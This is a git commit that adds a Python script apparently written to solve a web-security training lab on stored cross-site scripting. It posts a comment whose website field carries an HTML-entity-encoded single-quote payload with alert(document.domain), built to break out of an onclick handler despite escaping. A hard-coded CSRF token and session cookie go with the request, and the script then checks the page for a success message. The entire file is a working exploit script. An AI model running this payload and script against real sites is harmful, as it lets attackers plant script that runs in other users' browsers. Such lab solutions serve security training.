e92268663556c5ae87775273735571eea2cdb57e
Mohammed Hawary <01022823818l@gmail.com>
2023-09-11 08:37:07 +0300

    11/09/2023

---
+++ XSS/Stored_XSS_into_onclick_event_with_angle_brackets_and_double_quotes_HTML_encoded_and_single_quotes_and_backslash_escaped.py
@@ -0,0 +1,46 @@
+import requests
+import urllib3
+from sys import argv
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_website_url():
+    if len(argv) != 2:
+        print(f"[+] usage {argv[0]}")
+        print(f"[+] example {argv[0]} 'http://example.com'")
+        exit(-1)
+
+    if argv[1][-1] == '/':
+        url = argv[1][:-1]
+    else:
+        url = argv[1]
+
+    return url
+
+def attack(url): 
+    print("[+] Starting attack")
+    posts_path = "/post/comment"
+    xss_payload = "http://example.com?&#x27;-alert(document.domain)-&#x27;"
+
+    params = {
+    "csrf"   : "MPxBPbEgf5DKN1zW0KvtMLxpqiDrgeVp",
+    "postId" : 2,
+    "comment": "Stored XSS",
+    "name"   : "hacker",
+    "email"  : "hacker@hack.com",
+    "website": xss_payload
+    }
+    cookie = {"session" : "OW2mzMpbJ8itHTcqlkxAi873FHfKtUsY"}
+
+    print(f"[+] sending xss payload : {xss_payload}")
+
+    r = requests.post(url + posts_path, data=params, cookies=cookie)
+
+    r = requests.get(url)
+    if 'Congratulations' in r.text:
+        print("[+] attack successfully")
+    else:
+        print("[-] Attack un successfully")
+        print("[-] If you are sure that you ran the script without any errors and not work thin replace the csrf and session from code thats in your browser")
+
+attack(get_website_url())
